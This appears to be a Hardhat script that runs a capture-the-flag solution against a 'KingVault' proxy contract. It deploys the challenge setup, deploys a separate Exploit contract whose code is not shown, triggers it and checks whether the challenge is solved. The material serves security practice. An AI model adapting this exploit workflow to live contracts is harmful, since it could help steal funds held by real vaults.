const { parseEther, formatBytes32String } = require("ethers/lib/utils");
var path = require('path');
var scriptName = path.basename(__filename, '.js');
const { ethers, waffle} = require("hardhat");
const provider = waffle.provider;

async function main() {
  const SETUP = await ethers.getContractFactory("contracts/" + scriptName + "/Setup.sol:Setup");
  const EXPLOIT = await ethers.getContractFactory("contracts/" + scriptName + "/Exploit.sol:Exploit");

  const setup = await SETUP.deploy({value: parseEther("0.2")});
  const challenge = await ethers.getContractAt("KingVault", await setup.instance()); // actually ERC1967Proxy
  console.log("solved:", await setup.isSolved());

  const vault = await ethers.getContractAt("GovernanceTimelock", await challenge.owner());
  exploit = await EXPLOIT.deploy(challenge.address);
  await exploit.exploit();
  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
